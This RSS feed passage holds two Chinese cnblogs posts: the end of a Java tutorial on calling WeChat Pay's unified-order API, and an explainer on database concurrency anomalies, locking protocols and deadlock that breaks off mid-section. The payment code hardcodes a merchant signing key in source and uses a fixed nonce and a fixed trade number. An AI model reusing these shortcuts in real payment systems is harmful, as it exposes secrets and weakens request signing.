&lt;p&gt;二、在微信商户平台下载证书放在项目的resources目录下的cert文件夹下（cert文件夹需要自己建）&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1327924/201803/1327924-20180326145833856-1565539636.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;三、实现微信的WXPayConfig接口&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt; &lt;span&gt;package&lt;/span&gt;&lt;span&gt; com.ieou.demo.common;
&lt;/span&gt;&lt;span&gt; 2&lt;/span&gt; 
&lt;span&gt; 3&lt;/span&gt; 
&lt;span&gt; 4&lt;/span&gt; &lt;span&gt;import&lt;/span&gt;&lt;span&gt; com.github.wxpay.sdk.WXPayConfig;
&lt;/span&gt;&lt;span&gt; 5&lt;/span&gt; &lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.apache.commons.io.IOUtils;
&lt;/span&gt;&lt;span&gt; 6&lt;/span&gt; 
&lt;span&gt; 7&lt;/span&gt; &lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.io.ByteArrayInputStream;
&lt;/span&gt;&lt;span&gt; 8&lt;/span&gt; &lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.io.InputStream;
&lt;/span&gt;&lt;span&gt; 9&lt;/span&gt; 
&lt;span&gt;10&lt;/span&gt; &lt;span&gt;/**&lt;/span&gt;&lt;span&gt; 配置我们自己的信息  &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;11&lt;/span&gt; 
&lt;span&gt;12&lt;/span&gt; &lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; OurWxPayConfig &lt;span&gt;implements&lt;/span&gt;&lt;span&gt; WXPayConfig {
&lt;/span&gt;&lt;span&gt;13&lt;/span&gt; 
&lt;span&gt;14&lt;/span&gt;     &lt;span&gt;/**&lt;/span&gt;&lt;span&gt; 加载证书  这里证书需要到微信商户平台进行下载&lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;15&lt;/span&gt;     &lt;span&gt;private&lt;/span&gt; &lt;span&gt;byte&lt;/span&gt;&lt;span&gt; [] certData;
&lt;/span&gt;&lt;span&gt;16&lt;/span&gt; 
&lt;span&gt;17&lt;/span&gt;     &lt;span&gt;public&lt;/span&gt; OurWxPayConfig() &lt;span&gt;throws&lt;/span&gt;&lt;span&gt;  Exception{
&lt;/span&gt;&lt;span&gt;18&lt;/span&gt;         InputStream certStream = Thread.currentThread().getContextClassLoader().getResourceAsStream(&quot;cert/wxpay/apiclient_cert.p12&quot;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;19&lt;/span&gt;         &lt;span&gt;this&lt;/span&gt;.certData =&lt;span&gt; IOUtils.toByteArray(certStream);
&lt;/span&gt;&lt;span&gt;20&lt;/span&gt; &lt;span&gt;        certStream.close();
&lt;/span&gt;&lt;span&gt;21&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt;22&lt;/span&gt; 
&lt;span&gt;23&lt;/span&gt;     &lt;span&gt;/**&lt;/span&gt;&lt;span&gt; 设置我们自己的appid
&lt;/span&gt;&lt;span&gt;24&lt;/span&gt; &lt;span&gt;     * 商户号
&lt;/span&gt;&lt;span&gt;25&lt;/span&gt; &lt;span&gt;     * 秘钥
&lt;/span&gt;&lt;span&gt;26&lt;/span&gt; &lt;span&gt;     * &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;27&lt;/span&gt; 
&lt;span&gt;28&lt;/span&gt; &lt;span&gt;    @Override
&lt;/span&gt;&lt;span&gt;29&lt;/span&gt;     &lt;span&gt;public&lt;/span&gt;&lt;span&gt; String getAppID() {
&lt;/span&gt;&lt;span&gt;30&lt;/span&gt;         &lt;span&gt;return&lt;/span&gt; &quot;wx7494893843843c&quot;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;31&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt;32&lt;/span&gt; 
&lt;span&gt;33&lt;/span&gt; &lt;span&gt;    @Override
&lt;/span&gt;&lt;span&gt;34&lt;/span&gt;     &lt;span&gt;public&lt;/span&gt;&lt;span&gt; String getMchID() {
&lt;/span&gt;&lt;span&gt;35&lt;/span&gt;         &lt;span&gt;return&lt;/span&gt; &quot;4672984344&quot;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;36&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt;37&lt;/span&gt; 
&lt;span&gt;38&lt;/span&gt; &lt;span&gt;    @Override
&lt;/span&gt;&lt;span&gt;39&lt;/span&gt;     &lt;span&gt;public&lt;/span&gt;&lt;span&gt; String getKey() {
&lt;/span&gt;&lt;span&gt;40&lt;/span&gt;         &lt;span&gt;return&lt;/span&gt; &quot;qbH5l4N3468798dfgK&quot;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;41&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt;42&lt;/span&gt; 
&lt;span&gt;43&lt;/span&gt; &lt;span&gt;    @Override
&lt;/span&gt;&lt;span&gt;44&lt;/span&gt;     &lt;span&gt;public&lt;/span&gt;&lt;span&gt; InputStream getCertStream() {
&lt;/span&gt;&lt;span&gt;45&lt;/span&gt;         &lt;span&gt;return&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; ByteArrayInputStream(&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.certData);
&lt;/span&gt;&lt;span&gt;46&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt;47&lt;/span&gt; 
&lt;span&gt;48&lt;/span&gt; &lt;span&gt;    @Override
&lt;/span&gt;&lt;span&gt;49&lt;/span&gt;     &lt;span&gt;public&lt;/span&gt; &lt;span&gt;int&lt;/span&gt;&lt;span&gt; getHttpConnectTimeoutMs() {
&lt;/span&gt;&lt;span&gt;50&lt;/span&gt;         &lt;span&gt;return&lt;/span&gt; 0&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;51&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt;52&lt;/span&gt; 
&lt;span&gt;53&lt;/span&gt; &lt;span&gt;    @Override
&lt;/span&gt;&lt;span&gt;54&lt;/span&gt;     &lt;span&gt;public&lt;/span&gt; &lt;span&gt;int&lt;/span&gt;&lt;span&gt; getHttpReadTimeoutMs() {
&lt;/span&gt;&lt;span&gt;55&lt;/span&gt;         &lt;span&gt;return&lt;/span&gt; 0&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;56&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt;57&lt;/span&gt; }
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;四、构建自己的参数&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;package&lt;/span&gt;&lt;span&gt; com.ieou.demo.common;

&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.math.BigDecimal;

&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; WxpayParam {


    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt; 微信支付的金额是String类型 并且是以分为单位
     * 下面举个例子单位是元是怎么转为分的
     * &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
    BigDecimal totalPrice  &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt; BigDecimal(1); &lt;span&gt;//&lt;/span&gt;&lt;span&gt;此时的单位是元&lt;/span&gt;

    &lt;span&gt;private&lt;/span&gt; String body = &quot;xxx等商品信息&quot;&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; String totalFee = totalPrice.multiply(&lt;span&gt;new&lt;/span&gt; BigDecimal(100&lt;span&gt;)).toBigInteger().toString();
    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt; 随机数字字符串&lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt; String outTradeNo = &quot;4784984230432842944&quot;&lt;span&gt;;

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; String getBody() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; body;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; setBody(String body) {
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.body =&lt;span&gt; body;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; String getTotalFee() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; totalFee;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; setTotalFee(String totalFee) {
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.totalFee =&lt;span&gt; totalFee;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; String getOutTradeNo() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; outTradeNo;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; setOutTradeNo(String outTradeNo) {
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.outTradeNo =&lt;span&gt; outTradeNo;
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;五、配置微信统一下单接口需要的参数，并调用微信统一下单接口&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;61&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt; &lt;span&gt;package&lt;/span&gt;&lt;span&gt; com.ieou.demo.controller;
&lt;/span&gt;&lt;span&gt; 2&lt;/span&gt; 
&lt;span&gt; 3&lt;/span&gt; &lt;span&gt;import&lt;/span&gt;&lt;span&gt; com.github.wxpay.sdk.WXPay;
&lt;/span&gt;&lt;span&gt; 4&lt;/span&gt; &lt;span&gt;import&lt;/span&gt;&lt;span&gt; com.github.wxpay.sdk.WXPayUtil;
&lt;/span&gt;&lt;span&gt; 5&lt;/span&gt; &lt;span&gt;import&lt;/span&gt;&lt;span&gt; com.ieou.demo.common.OurWxPayConfig;
&lt;/span&gt;&lt;span&gt; 6&lt;/span&gt; &lt;span&gt;import&lt;/span&gt;&lt;span&gt; com.ieou.demo.common.WxpayParam;
&lt;/span&gt;&lt;span&gt; 7&lt;/span&gt; &lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.springframework.web.bind.annotation.GetMapping;
&lt;/span&gt;&lt;span&gt; 8&lt;/span&gt; &lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.springframework.web.bind.annotation.RequestMapping;
&lt;/span&gt;&lt;span&gt; 9&lt;/span&gt; &lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.springframework.web.bind.annotation.RestController;
&lt;/span&gt;&lt;span&gt;10&lt;/span&gt; 
&lt;span&gt;11&lt;/span&gt; &lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.util.HashMap;
&lt;/span&gt;&lt;span&gt;12&lt;/span&gt; &lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.util.Map;
&lt;/span&gt;&lt;span&gt;13&lt;/span&gt; 
&lt;span&gt;14&lt;/span&gt; 
&lt;span&gt;15&lt;/span&gt; &lt;span&gt;@RestController
&lt;/span&gt;&lt;span&gt;16&lt;/span&gt; @RequestMapping(&quot;/&quot;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;17&lt;/span&gt; &lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; WxPayController {
&lt;/span&gt;&lt;span&gt;18&lt;/span&gt; 
&lt;span&gt;19&lt;/span&gt;     @GetMapping(&quot;/pay&quot;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;20&lt;/span&gt;     &lt;span&gt;public&lt;/span&gt; Map&amp;lt;String,String&amp;gt; wxPayFunction() &lt;span&gt;throws&lt;/span&gt;&lt;span&gt; Exception{
&lt;/span&gt;&lt;span&gt;21&lt;/span&gt; 
&lt;span&gt;22&lt;/span&gt;         WxpayParam wxpayParam = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; WxpayParam();
&lt;/span&gt;&lt;span&gt;23&lt;/span&gt;         String notifyUrl = &quot;www.baidu.com&quot;;  &lt;span&gt;//&lt;/span&gt;&lt;span&gt;我这里的回调地址是随便写的，到时候需要换成处理业务的回调接口&lt;/span&gt;
&lt;span&gt;24&lt;/span&gt; 
&lt;span&gt;25&lt;/span&gt;         OurWxPayConfig ourWxPayConfig = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; OurWxPayConfig();
&lt;/span&gt;&lt;span&gt;26&lt;/span&gt;         WXPay wxPay = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; WXPay(ourWxPayConfig);
&lt;/span&gt;&lt;span&gt;27&lt;/span&gt; 
&lt;span&gt;28&lt;/span&gt;         &lt;span&gt;//&lt;/span&gt;&lt;span&gt;根据微信支付api来设置&lt;/span&gt;
&lt;span&gt;29&lt;/span&gt;         Map&amp;lt;String,String&amp;gt; data = &lt;span&gt;new&lt;/span&gt; HashMap&amp;lt;&amp;gt;&lt;span&gt;();
&lt;/span&gt;&lt;span&gt;30&lt;/span&gt;         data.put(&quot;appid&quot;&lt;span&gt;,ourWxPayConfig.getAppID());
&lt;/span&gt;&lt;span&gt;31&lt;/span&gt;         data.put(&quot;mch_id&quot;,ourWxPayConfig.getMchID());         &lt;span&gt;//&lt;/span&gt;&lt;span&gt;商户号&lt;/span&gt;
&lt;span&gt;32&lt;/span&gt;         data.put(&quot;trade_type&quot;,&quot;APP&quot;);                         &lt;span&gt;//&lt;/span&gt;&lt;span&gt;支付场景 APP 微信app支付 JSAPI 公众号支付  NATIVE 扫码支付&lt;/span&gt;
&lt;span&gt;33&lt;/span&gt;         data.put(&quot;notify_url&quot;,notifyUrl);                     &lt;span&gt;//&lt;/span&gt;&lt;span&gt;回调地址&lt;/span&gt;
&lt;span&gt;34&lt;/span&gt;         data.put(&quot;spbill_create_ip&quot;,&quot;127.0.0.1&quot;);             &lt;span&gt;//&lt;/span&gt;&lt;span&gt;终端ip&lt;/span&gt;
&lt;span&gt;35&lt;/span&gt;         data.put(&quot;total_fee&quot;,wxpayParam.getTotalFee());       &lt;span&gt;//&lt;/span&gt;&lt;span&gt;订单总金额&lt;/span&gt;
&lt;span&gt;36&lt;/span&gt;         data.put(&quot;fee_type&quot;,&quot;CNY&quot;);                           &lt;span&gt;//&lt;/span&gt;&lt;span&gt;默认人民币&lt;/span&gt;
&lt;span&gt;37&lt;/span&gt;         data.put(&quot;out_trade_no&quot;,wxpayParam.getOutTradeNo());   &lt;span&gt;//&lt;/span&gt;&lt;span&gt;交易号&lt;/span&gt;
&lt;span&gt;38&lt;/span&gt;         data.put(&quot;body&quot;&lt;span&gt;,wxpayParam.getBody());
&lt;/span&gt;&lt;span&gt;39&lt;/span&gt;         data.put(&quot;nonce_str&quot;,&quot;bfrhncjkfdkfd&quot;);   &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 随机字符串小于32位&lt;/span&gt;
&lt;span&gt;40&lt;/span&gt;         String s = WXPayUtil.generateSignature(data, ourWxPayConfig.getKey());  &lt;span&gt;//&lt;/span&gt;&lt;span&gt;签名&lt;/span&gt;
&lt;span&gt;41&lt;/span&gt;         data.put(&quot;sign&quot;&lt;span&gt;,s);
&lt;/span&gt;&lt;span&gt;42&lt;/span&gt;         
&lt;span&gt;43&lt;/span&gt;         &lt;span&gt;/**&lt;/span&gt;&lt;span&gt; wxPay.unifiedOrder 这个方法中调用微信统一下单接口 &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;44&lt;/span&gt;         Map&amp;lt;String, String&amp;gt; respData =&lt;span&gt; wxPay.unifiedOrder(data); 
&lt;/span&gt;&lt;span&gt;45&lt;/span&gt;         &lt;span&gt;if&lt;/span&gt; (respData.get(&quot;return_code&quot;).equals(&quot;SUCCESS&quot;&lt;span&gt;)){
&lt;/span&gt;&lt;span&gt;46&lt;/span&gt; 
&lt;span&gt;47&lt;/span&gt;             &lt;span&gt;//&lt;/span&gt;&lt;span&gt;返回给APP端的参数，APP端再调起支付接口&lt;/span&gt;
&lt;span&gt;48&lt;/span&gt;             Map&amp;lt;String,String&amp;gt; repData = &lt;span&gt;new&lt;/span&gt; HashMap&amp;lt;&amp;gt;&lt;span&gt;();
&lt;/span&gt;&lt;span&gt;49&lt;/span&gt;             repData.put(&quot;appid&quot;&lt;span&gt;,ourWxPayConfig.getAppID());
&lt;/span&gt;&lt;span&gt;50&lt;/span&gt;             repData.put(&quot;partnerid&quot;&lt;span&gt;,ourWxPayConfig.getMchID());
&lt;/span&gt;&lt;span&gt;51&lt;/span&gt;             repData.put(&quot;prepayid&quot;,respData.get(&quot;prepay_id&quot;&lt;span&gt;));
&lt;/span&gt;&lt;span&gt;52&lt;/span&gt;             repData.put(&quot;package&quot;,&quot;WXPay&quot;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;53&lt;/span&gt;             repData.put(&quot;noncestr&quot;,respData.get(&quot;nonce_str&quot;&lt;span&gt;));
&lt;/span&gt;&lt;span&gt;54&lt;/span&gt;             repData.put(&quot;timestamp&quot;,String.valueOf(System.currentTimeMillis()/1000&lt;span&gt;));
&lt;/span&gt;&lt;span&gt;55&lt;/span&gt;             String sign = WXPayUtil.generateSignature(repData,ourWxPayConfig.getKey()); &lt;span&gt;//&lt;/span&gt;&lt;span&gt;签名&lt;/span&gt;
&lt;span&gt;56&lt;/span&gt;             respData.put(&quot;sign&quot;&lt;span&gt;,sign);
&lt;/span&gt;&lt;span&gt;57&lt;/span&gt;             respData.put(&quot;timestamp&quot;,repData.get(&quot;timestamp&quot;&lt;span&gt;));
&lt;/span&gt;&lt;span&gt;58&lt;/span&gt;             respData.put(&quot;package&quot;,&quot;WXPay&quot;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;59&lt;/span&gt;             &lt;span&gt;return&lt;/span&gt;&lt;span&gt; respData;
&lt;/span&gt;&lt;span&gt;60&lt;/span&gt; &lt;span&gt;        }
&lt;/span&gt;&lt;span&gt;61&lt;/span&gt;         &lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; Exception(respData.get(&quot;return_msg&quot;&lt;span&gt;));
&lt;/span&gt;&lt;span&gt;62&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt;63&lt;/span&gt; }
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;六、至此，后端代码已经结束，前端拿到返回值调用微信发起支付接口就可以了。&lt;/p&gt;
</description>
<pubDate>Mon, 26 Mar 2018 07:11:00 +0000</pubDate>
<dc:creator>低调的小白</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/wang-yaz/p/8632624.html</dc:identifier>
</item>
<item>
<title>【眼见为实】数据库并发问题 封锁协议 隔离级别 - 喜欢天黑却怕鬼</title>
<link>http://www.cnblogs.com/songwenjie/p/8644674.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/songwenjie/p/8644674.html</guid>
<description>&lt;p&gt;此篇博客是【眼见为实】系列的第一篇博客，主要从理论上讲了数据库并发可能会出现的问题，解决并发问题的技术——封锁，封锁约定的规则——封锁协议。然后简单说明了数据库事务隔离级别和封锁协议的对应关系。后面的几篇博客都是通过亲身实践探究InnoDB引擎在各个隔离级别下的实现细节。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.cnblogs.com/songwenjie/p/8644674.html&quot;&gt;&lt;span&gt;【眼见为实】数据库并发问题 封锁协议 隔离级别&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.cnblogs.com/songwenjie/p/8644599.html&quot;&gt;&lt;span&gt;【眼见为实】自己动手实践理解READ UNCOMMITED &amp;amp;&amp;amp; SERIALIZABLE&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.cnblogs.com/songwenjie/p/8644646.html&quot;&gt;&lt;span&gt;【眼见为实】自己动手实践理解 READ COMMITTED &amp;amp;&amp;amp; MVCC&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.cnblogs.com/songwenjie/p/8643684.html&quot;&gt;&lt;span&gt;【眼见为实】自己动手实践理解REPEATABLE READ &amp;amp;&amp;amp; Next-Key Lock&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;丢失修改lost-update&quot;&gt;①丢失修改(Lost Update)&lt;/h2&gt;
&lt;p&gt;两个事务T1和T2同时读入同一数据并修改，T2的提交的结果破坏了T1提交的结果，导致T1的修改被丢失（第二类丢失更新）。&lt;br/&gt;&lt;img src=&quot;http://p66d6e5qt.bkt.clouddn.com/blog/180326/AfIci0DCi2.png?imageslim&quot; alt=&quot;mark&quot;/&gt;&lt;/p&gt;
&lt;p&gt;还有一种特殊的丢失修改（第一类丢失更新），如下图。因为这种丢失修改在【READ UNCOMMITED】隔离级别下都不会出现，所以不进行讨论。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://p66d6e5qt.bkt.clouddn.com/blog/180326/EjFaEDcIeb.png?imageslim&quot; alt=&quot;mark&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;不可重复读non-repeatable-read&quot;&gt;②不可重复读(Non-Repeatable Read)&lt;/h2&gt;
&lt;p&gt;事务T1读取数据后，事务T2执行更新操作，使事务T1无法再现前一次读取结果。&lt;br/&gt;具体包括三种情况：&lt;br/&gt;(1)事务T1读取某一数据后，事务T2对其做了修改，当事务T1再次读取该数据时，得到与前一次不同的值。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://p66d6e5qt.bkt.clouddn.com/blog/180326/IcikkI4iAE.png?imageslim&quot; alt=&quot;mark&quot;/&gt;&lt;/p&gt;
&lt;p&gt;(2)事务T1按照一定条件读取了某些数据记录后，事务T2删掉了其中部分记录，当T1再次按相同条件查询数据时，发现某些记录消失了。&lt;br/&gt;(3)事务T1按照一定条件读取了某些数据记录后，事务T2插入了一些记录，当T1再次按相同条件查询数据时，发现多了一些记录。&lt;/p&gt;
&lt;h2 id=&quot;幻读phantom-read&quot;&gt;③幻读(Phantom Read)&lt;/h2&gt;
&lt;p&gt;幻读其实是不可重复读的一种特殊情况。不可重复读(2)和(3)也称为幻读现象。不可重复读是对数据的修改更新产生的；而幻读是插入或删除数据产生的。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://p66d6e5qt.bkt.clouddn.com/blog/180326/jHj9HK7JC9.png?imageslim&quot; alt=&quot;mark&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;读脏数据dirty-read&quot;&gt;④读脏数据（Dirty Read）&lt;/h2&gt;
&lt;p&gt;事务T1修改某一数据，并将其写回磁盘，事务T2读取同一数据后，T1因为某些原因回滚，这时T1修改过的数据恢复原值，T2读取到的数据就与数据库中的数据不一致，则T2读取到数据就为“脏数据“，即不正确的数据。&lt;br/&gt;&lt;img src=&quot;http://p66d6e5qt.bkt.clouddn.com/blog/180326/332A3bh84B.png?imageslim&quot; alt=&quot;mark&quot;/&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;基本封锁类型&lt;/strong&gt;：&lt;br/&gt;&lt;strong&gt;①排它锁(Exclusive Locks,简称X锁)&lt;/strong&gt;&lt;br/&gt;排它锁又称为写锁。若事务T对数据对象A加上X锁，则只允许T修改和读取A，其他任何事务都不能再对A加任何类型的锁，直到T释放A上的锁。这就保证了其他事务在T释放A上的锁之前都不能再读取和修改A。&lt;br/&gt;&lt;strong&gt;②共享锁(Share Locks,简称S锁)&lt;/strong&gt;&lt;br/&gt;共享锁又称为读锁。若事务T对数据对象A加上S锁，则事务T可以读取A但不能修改A。其他事务只能再对A加S锁,而不能加X锁,直到T释放A上的S锁。这就保证了其他事务可以读取A，但是在T释放A上的S锁之前不能对A做任何修改。&lt;/p&gt;
&lt;h3 id=&quot;排它锁与共享锁的相容矩阵&quot;&gt;排它锁与共享锁的相容矩阵&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;http://p66d6e5qt.bkt.clouddn.com/blog/180326/Alf331JLIF.png?imageslim&quot; alt=&quot;mark&quot;/&gt;&lt;/p&gt;

&lt;p&gt;在运用X锁和S锁这两种基本封锁，对数据对象加锁时，还需要约定一些规则。例如何时申请X锁和S锁，持锁时间，何时释放等。这些规格称为封锁协议。&lt;/p&gt;
&lt;h2 id=&quot;一级封锁协议&quot;&gt;一级封锁协议&lt;/h2&gt;
&lt;p&gt;一级封锁协议：&lt;strong&gt;事务T在修改数据A之前必须对其加X锁，直到事务结束才释放。事务结束包括正常结束（Commit）和非正常结束（RollBack）&lt;/strong&gt;。&lt;br/&gt;&lt;strong&gt;一级封锁协议可防止丢失修改&lt;/strong&gt;。&lt;br/&gt;使用一级封锁协议解决了图1中的覆盖丢失问题。事务T1在读A进行修改之前先对A加X锁，当T2再请求对A加X锁时被拒绝，T2只能等待T1释放A上的锁后T2获得A上的X锁，这时它读取的A已经是T1修改后的15，再按照此值进行计算，将结果值A=14写入磁盘。这样就避免了丢失T1的更新。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://p66d6e5qt.bkt.clouddn.com/blog/180326/kjedjIA2bB.png?imageslim&quot; alt=&quot;mark&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;二级封锁协议&quot;&gt;二级封锁协议&lt;/h2&gt;
&lt;p&gt;二级封锁协议：&lt;strong&gt;一级封锁协议加上事务T在读取数据A之前必须先对其加S锁，读完后即可释放S锁&lt;/strong&gt;。&lt;br/&gt;&lt;strong&gt;二级封锁协议除防止了丢失修改，还进一步防止了读“脏”数据&lt;/strong&gt;。&lt;br/&gt;使用二级封锁协议解决了图2中的脏读问题。事务T1在读C进行修改之前先对C加X锁,修改其值后写回磁盘。这时T2请求在C上加S锁，因为T1在C上已经加了X锁，所以T2只能等待。T1因为某种原因被撤销，C恢复原值100。T1释放C上的X锁后T2获得C上的S锁，读C=100。这样就避免了读“脏”数据。&lt;br/&gt;&lt;img src=&quot;http://p66d6e5qt.bkt.clouddn.com/blog/180326/DI1Cf3lfK9.png?imageslim&quot; alt=&quot;mark&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;三级封锁协议&quot;&gt;三级封锁协议&lt;/h2&gt;
&lt;p&gt;三级封锁协议：&lt;strong&gt;一级封锁协议加上事务T在读取数据A之前必须先对其加S锁，直到事务结束才释放&lt;/strong&gt;。&lt;br/&gt;&lt;strong&gt;三级封锁协议除防止了丢失修改和读“脏”数据，还进一步防止了不可重复读&lt;/strong&gt;。&lt;br/&gt;使用三级封锁协议解决了图3中的不可重复读问题。事务T1在读取数据A和数据B之前对其加S锁，其他事务只能再对A、B加S锁，不能加X锁，这样其他事务只能读取A、B,而不能更改A、B。这时T2请求在B上加X锁，因为T1已经在B上加了S锁，所以T2只能等待。T1为了验算结果再次读取A、B的值，因为其他事务无法修改A、B的值，所以结果仍然为150，即可重复读。此时T1释放A、B上的S锁，T2才获得B上的X锁。这样就避免了不可重复读。&lt;br/&gt;&lt;img src=&quot;http://p66d6e5qt.bkt.clouddn.com/blog/180326/a14Jb0kAhi.png?imageslim&quot; alt=&quot;mark&quot;/&gt;&lt;/p&gt;

&lt;p&gt;封锁可能会引起活锁活死锁。&lt;/p&gt;
&lt;h2 id=&quot;活锁&quot;&gt;活锁&lt;/h2&gt;
&lt;p&gt;如果事务T1封锁了数据R，事务T2又请求封锁数据R，于是T2等待。事务T3也请求封锁R，当事务T1释放了数据R上的封锁之后系统首先批准了事务T3的封锁请求，T2仍然等待。然后T4又申请封锁R，当T3释放了R的封锁之后系统又批准了T4的封锁请求。T2有可能一直等待下去，这就是活锁。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://p66d6e5qt.bkt.clouddn.com/blog/180326/BLGlgH8D1C.png?imageslim&quot; alt=&quot;mark&quot;/&gt;&lt;/p&gt;
&lt;p&gt;避免活锁的方法就是先来先服务的策略。当多个事务请求对同一数据对象封锁时，封锁子系统按照请求的先后对事务排队。数据对象上的锁一旦释放就批准申请队列中的第一个事务获得锁。&lt;/p&gt;
&lt;h2 id=&quot;死锁&quot;&gt;死锁&lt;/h2&gt;
&lt;p&gt;如果事务T1封锁了数据R1，事务T2封锁了数据R2,然后T1又请求封锁数据R2，因为T2已经封锁了数据R2，于是T1等待T2释放R2上的锁。接着T2又申请封锁R1，因为因为T1已经封锁了数据R1，T2也只能等待T1释放R1上的锁。这样就出现了T1在等待T2，T2也在等待T1的局面，T1和T2两个事务永远不能结束，形成死锁。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://p66d6e5qt.bkt.clouddn.com/blog/180326/camdBC7eCI.png?imageslim&quot; alt=&quot;mark&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;死锁的预防&lt;/strong&gt;：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;①一次封锁法&lt;/strong&gt;&lt;/p&gt;
